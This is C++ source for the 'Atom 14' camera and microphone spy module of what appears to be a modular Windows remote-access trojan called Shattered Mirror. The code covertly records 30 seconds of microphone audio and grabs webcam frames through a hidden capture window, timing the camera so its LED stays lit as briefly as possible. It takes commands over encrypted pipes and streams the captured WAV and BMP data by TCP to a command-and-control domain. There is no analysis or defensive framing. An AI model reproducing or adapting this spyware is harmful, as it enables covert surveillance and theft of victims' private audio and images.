/*=============================================================================
 * Shattered Mirror v1 — Atom 14: Camera & Microphone Spy
 * Combined capture atom. Uses waveIn API for microphone recording
 * and AVICAP32 (capCreateCaptureWindow) for webcam snapshots.
 * Commands: "MIC" = audio only, "CAM" = camera only, "BOTH" = both
 * Audio is recorded as raw PCM -> WAV header appended before send.
 * Camera captures single frames to minimize LED exposure time.
 *===========================================================================*/

#include "Atom_14_Spy.h"
#include "../Orchestrator/AtomManager.h"
#include "../Orchestrator/Config.h"
#include <cstdio>
#include <cstring>
#include <string>
#include <vector>
#include <mmsystem.h>
#include <vfw.h>

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "vfw32.lib")
#pragma comment(lib, "ws2_32.lib")

static void SpyDebug(const char *format, ...) {
    char buf[512];
    va_list args;
    va_start(args, format);
    vsnprintf(buf, sizeof(buf), format, args);
    va_end(args);
    FILE *f = fopen("log\\spy_debug.txt", "a");
    if (f) { fprintf(f, "%s\n", buf); fclose(f); }
}

/* =========================================================================
 *  MICROPHONE CAPTURE (waveIn API — no third-party DLLs)
 * ========================================================================= */
#define MIC_SAMPLE_RATE   16000
#define MIC_BITS          16
#define MIC_CHANNELS      1
#define MIC_BUFFER_SIZE   (MIC_SAMPLE_RATE * (MIC_BITS / 8) * MIC_CHANNELS) // 1 second
#define MIC_DURATION_SEC  30   // Record 30 seconds per capture

static std::vector<BYTE> s_AudioData;
static CRITICAL_SECTION s_AudioLock;
static volatile BOOL s_bRecording = FALSE;

static void CALLBACK WaveInProc(HWAVEIN hwi, UINT uMsg, DWORD_PTR dwInstance,
                                 DWORD_PTR dwParam1, DWORD_PTR dwParam2) {
    if (uMsg == WIM_DATA) {
        WAVEHDR *pHdr = (WAVEHDR*)dwParam1;
        if (pHdr->dwBytesRecorded > 0 && s_bRecording) {
            EnterCriticalSection(&s_AudioLock);
            s_AudioData.insert(s_AudioData.end(),
                               pHdr->lpData, pHdr->lpData + pHdr->dwBytesRecorded);
            LeaveCriticalSection(&s_AudioLock);
        }
        // Re-queue the buffer if still recording
        if (s_bRecording) {
            waveInAddBuffer(hwi, pHdr, sizeof(WAVEHDR));
        }
    }
}

static BOOL RecordMicrophone(DWORD dwDurationSec, std::vector<BYTE> &outWav) {
    InitializeCriticalSection(&s_AudioLock);
    s_AudioData.clear();
    s_bRecording = TRUE;

    WAVEFORMATEX wfx = {0};
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = MIC_CHANNELS;
    wfx.nSamplesPerSec = MIC_SAMPLE_RATE;
    wfx.wBitsPerSample = MIC_BITS;
    wfx.nBlockAlign = wfx.nChannels * (wfx.wBitsPerSample / 8);
    wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;

    HWAVEIN hWaveIn = NULL;
    MMRESULT res = waveInOpen(&hWaveIn, WAVE_MAPPER, &wfx, (DWORD_PTR)WaveInProc, 0, CALLBACK_FUNCTION);
    if (res != MMSYSERR_NOERROR) {
        SpyDebug("[Mic] waveInOpen failed: %d", res);
        s_bRecording = FALSE;
        DeleteCriticalSection(&s_AudioLock);
        return FALSE;
    }

    // Prepare double buffers
    const int NUM_BUFFERS = 4;
    WAVEHDR headers[NUM_BUFFERS] = {0};
    char *buffers[NUM_BUFFERS];
    for (int i = 0; i < NUM_BUFFERS; i++) {
        buffers[i] = (char*)malloc(MIC_BUFFER_SIZE);
        headers[i].lpData = buffers[i];
        headers[i].dwBufferLength = MIC_BUFFER_SIZE;
        waveInPrepareHeader(hWaveIn, &headers[i], sizeof(WAVEHDR));
        waveInAddBuffer(hWaveIn, &headers[i], sizeof(WAVEHDR));
    }

    waveInStart(hWaveIn);
    SpyDebug("[Mic] Recording for %lu seconds...", dwDurationSec);

    // Record for the specified duration
    Sleep(dwDurationSec * 1000);

    s_bRecording = FALSE;
    waveInStop(hWaveIn);
    waveInReset(hWaveIn);

    for (int i = 0; i < NUM_BUFFERS; i++) {
        waveInUnprepareHeader(hWaveIn, &headers[i], sizeof(WAVEHDR));
        free(buffers[i]);
    }
    waveInClose(hWaveIn);

    // Build WAV file in memory
    DWORD dataSize = (DWORD)s_AudioData.size();
    DWORD fileSize = 44 + dataSize; // WAV header + PCM data

    outWav.resize(fileSize);
    BYTE *p = outWav.data();

    // RIFF header
    memcpy(p, "RIFF", 4); p += 4;
    *(DWORD*)p = fileSize - 8; p += 4;
    memcpy(p, "WAVE", 4); p += 4;

    // fmt chunk
    memcpy(p, "fmt ", 4); p += 4;
    *(DWORD*)p = 16; p += 4;                    // Chunk size
    *(WORD*)p = WAVE_FORMAT_PCM; p += 2;         // Format
    *(WORD*)p = MIC_CHANNELS; p += 2;            // Channels
    *(DWORD*)p = MIC_SAMPLE_RATE; p += 4;        // Sample rate
    *(DWORD*)p = wfx.nAvgBytesPerSec; p += 4;   // Byte rate
    *(WORD*)p = wfx.nBlockAlign; p += 2;         // Block align
    *(WORD*)p = MIC_BITS; p += 2;                // Bits per sample

    // data chunk
    memcpy(p, "data", 4); p += 4;
    *(DWORD*)p = dataSize; p += 4;
    memcpy(p, s_AudioData.data(), dataSize);

    s_AudioData.clear();
    DeleteCriticalSection(&s_AudioLock);

    SpyDebug("[Mic] WAV built: %lu bytes (%lu seconds)", fileSize, dwDurationSec);
    return TRUE;
}

/* =========================================================================
 *  WEBCAM CAPTURE (AVICAP32 — built into Windows, no extra DLLs)
 * ========================================================================= */
static BOOL CaptureWebcamFrame(std::vector<BYTE> &outBmp) {
    // Create a hidden capture window
    HWND hCapWnd = capCreateCaptureWindowA("SpyCam", WS_POPUP, 0, 0, 640, 480, NULL, 0);
    if (!hCapWnd) {
        SpyDebug("[Cam] capCreateCaptureWindow failed.");
        return FALSE;
    }

    // Connect to the first video device
    if (!capDriverConnect(hCapWnd, 0)) {
        SpyDebug("[Cam] capDriverConnect failed. No webcam?");
        DestroyWindow(hCapWnd);
        return FALSE;
    }

    // Set preview off (don't show anything)
    capPreview(hCapWnd, FALSE);
    capOverlay(hCapWnd, FALSE);

    // Grab a single frame
    Sleep(500); // Give the camera 500ms to warm up
    capGrabFrame(hCapWnd);

    // Save frame to a temp BMP file (avicap32 limitation)
    char szTempBmp[MAX_PATH];
    sprintf_s(szTempBmp, "C:\\Users\\Public\\%lu_cam.tmp", GetTickCount());
    capFileSaveDIB(hCapWnd, szTempBmp);

    // Disconnect camera ASAP to minimize LED time
    capDriverDisconnect(hCapWnd);
    DestroyWindow(hCapWnd);

    // Read the BMP into memory
    HANDLE hFile = CreateFileA(szTempBmp, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD dwSize = GetFileSize(hFile, NULL);
        outBmp.resize(dwSize);
        DWORD dwRead = 0;
        ReadFile(hFile, outBmp.data(), dwSize, &dwRead, NULL);
        CloseHandle(hFile);
    }
    DeleteFileA(szTempBmp); // Cleanup

    SpyDebug("[Cam] Frame captured: %zu bytes", outBmp.size());
    return !outBmp.empty();
}

/* === MAIN ENTRY POINT === */
DWORD WINAPI SpyCamAtomMain(LPVOID lpParam) {
    DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
    SpyDebug("[Atom 14] Spy Camera/Mic started. ID: %lu", dwAtomId);

    HANDLE hCmdPipe = IPC_ConnectToCommandPipe(dwAtomId);
    if (!hCmdPipe) { SpyDebug("[Atom 14] FATAL: Command pipe failed."); return 1; }

    HANDLE hReportPipe = IPC_ConnectToReportPipe(dwAtomId);
    if (!hReportPipe) { CloseHandle(hCmdPipe); return 1; }

    BYTE SharedSessionKey[16];
    memcpy(SharedSessionKey, Config::PSK_ID, 16);

    // Send CMD_READY
    IPC_MESSAGE readyMsg = {0};
    readyMsg.dwSignature = 0x534D4952;
    readyMsg.CommandId = CMD_READY;
    readyMsg.AtomId = dwAtomId;
    IPC_SendMessage(hReportPipe, &readyMsg, SharedSessionKey, 16);

    while (TRUE) {
        DWORD dwAvail = 0;
        if (PeekNamedPipe(hCmdPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
            IPC_MESSAGE inMsg = {0};
            if (IPC_ReceiveMessage(hCmdPipe, &inMsg, SharedSessionKey, 16)) {
                if (inMsg.CommandId == CMD_EXECUTE) {
                    std::string cmd((char*)inMsg.Payload, inMsg.dwPayloadLen);
                    SpyDebug("[Atom 14] Command: %s", cmd.c_str());
                    BOOL bDoMic = (cmd == "MIC" || cmd == "BOTH" || cmd == "BALE_MIC" || cmd == "BALE_BOTH");
                    BOOL bDoCam = (cmd == "CAM" || cmd == "BOTH" || cmd == "BALE_CAM" || cmd == "BALE_BOTH");
                    BOOL bIsBale = (cmd.find("BALE_") == 0);

                    // === MICROPHONE ===
                    if (bDoMic) {
                        SpyDebug("[Atom 14] Recording microphone (30s)...");
                        std::vector<BYTE> wavData;
                        if (RecordMicrophone(30, wavData)) {
                            if (bIsBale) {
                                FILE *f = NULL;
                                fopen_s(&f, "log\\spy_mic.wav", "wb");
                                if (f) {
                                    fwrite(wavData.data(), 1, wavData.size(), f);
                                    fclose(f);
                                    char fullPath[MAX_PATH];
                                    GetFullPathNameA("log\\spy_mic.wav", MAX_PATH, fullPath, NULL);
                                    char report[MAX_PATH + 32];
                                    sprintf_s(report, "[SPY_MIC_READY] %s", fullPath);
                                    IPC_MESSAGE msg = {0};
                                    msg.dwSignature = 0x534D4952;
                                    msg.CommandId = CMD_REPORT;
                                    msg.AtomId = dwAtomId;
                                    msg.dwPayloadLen = (DWORD)strlen(report);
                                    memcpy(msg.Payload, report, msg.dwPayloadLen);
                                    IPC_SendMessage(hReportPipe, &msg, SharedSessionKey, 16);
                                }
                            } else {
                                // === TURBO TCP STREAMING ===
                                SOCKET sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
                                if (sock != INVALID_SOCKET) {
                                    struct hostent *host = gethostbyname(Config::C2_DOMAIN);
                                    if (host) {
                                        SOCKADDR_IN sin;
                                        memset(&sin, 0, sizeof(sin));
                                        sin.sin_family = AF_INET;
                                        sin.sin_port = htons(Config::PUBLIC_PORT); 
                                        sin.sin_addr.s_addr = *((unsigned long*)host->h_addr);
                                        
                                        if (connect(sock, (SOCKADDR*)&sin, sizeof(sin)) != SOCKET_ERROR) {
                                            char header[128];
                                            sprintf_s(header, "[SPY_MIC] size=%zu", wavData.size());
                                            send(sock, header, (int)strlen(header) + 1, 0);
                                            send(sock, (const char*)wavData.data(), (int)wavData.size(), 0);
                                            SpyDebug("[Atom 14] Mic data sent via Turbo TCP.");
                                        }
                                    }
                                    closesocket(sock);
                                }
                            }
                        } else {
                            char err[] = "[SPY_MIC] Recording failed (no microphone?).";
                            IPC_MESSAGE errMsg = {0};
                            errMsg.dwSignature = 0x534D4952;
                            errMsg.CommandId = CMD_REPORT;
                            errMsg.AtomId = dwAtomId;
                            errMsg.dwPayloadLen = (DWORD)strlen(err);
                            memcpy(errMsg.Payload, err, errMsg.dwPayloadLen);
                            IPC_SendMessage(hReportPipe, &errMsg, SharedSessionKey, 16);
                        }
                    }

                    // === CAMERA ===
                    if (bDoCam) {
                        SpyDebug("[Atom 14] Capturing webcam frame...");
                        std::vector<BYTE> bmpData;
                        if (CaptureWebcamFrame(bmpData)) {
                            if (bIsBale) {
                                FILE *f = NULL;
                                fopen_s(&f, "log\\spy_cam.bmp", "wb");
                                if (f) {
                                    fwrite(bmpData.data(), 1, bmpData.size(), f);
                                    fclose(f);
                                    char fullPath[MAX_PATH];
                                    GetFullPathNameA("log\\spy_cam.bmp", MAX_PATH, fullPath, NULL);
                                    char report[MAX_PATH + 32];
                                    sprintf_s(report, "[SPY_CAM_READY] %s", fullPath);
                                    IPC_MESSAGE msg = {0};
                                    msg.dwSignature = 0x534D4952;
                                    msg.CommandId = CMD_REPORT;
                                    msg.AtomId = dwAtomId;
                                    msg.dwPayloadLen = (DWORD)strlen(report);
                                    memcpy(msg.Payload, report, msg.dwPayloadLen);
                                    IPC_SendMessage(hReportPipe, &msg, SharedSessionKey, 16);
                                }
                            } else {
                                // === TURBO TCP STREAMING ===
                                SOCKET sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
                                if (sock != INVALID_SOCKET) {
                                    struct hostent *host = gethostbyname(Config::C2_DOMAIN);
                                    if (host) {
                                        SOCKADDR_IN sin;
                                        memset(&sin, 0, sizeof(sin));
                                        sin.sin_family = AF_INET;
                                        sin.sin_port = htons(Config::PUBLIC_PORT); 
                                        sin.sin_addr.s_addr = *((unsigned long*)host->h_addr);
                                        
                                        if (connect(sock, (SOCKADDR*)&sin, sizeof(sin)) != SOCKET_ERROR) {
                                            char header[128];
                                            sprintf_s(header, "[SPY_CAM] size=%zu", bmpData.size());
                                            send(sock, header, (int)strlen(header) + 1, 0);
                                            send(sock, (const char*)bmpData.data(), (int)bmpData.size(), 0);
                                            SpyDebug("[Atom 14] Cam data sent via Turbo TCP.");
                                        }
                                    }
                                    closesocket(sock);
                                }
                            }
                        } else {
                            char err[] = "[SPY_CAM] Capture failed (no webcam?).";
                            IPC_MESSAGE errMsg = {0};
                            errMsg.dwSignature = 0x534D4952;
                            errMsg.CommandId = CMD_REPORT;
                            errMsg.AtomId = dwAtomId;
                            errMsg.dwPayloadLen = (DWORD)strlen(err);
                            memcpy(errMsg.Payload, err, errMsg.dwPayloadLen);
                            IPC_SendMessage(hReportPipe, &errMsg, SharedSessionKey, 16);
                        }
                    }

                } else if (inMsg.CommandId == CMD_TERMINATE) {
                    SpyDebug("[Atom 14] CMD_TERMINATE received.");
                    break;
                }
            }
        }
        Sleep(100);
    }

    CloseHandle(hCmdPipe);
    CloseHandle(hReportPipe);
    return 0;
}
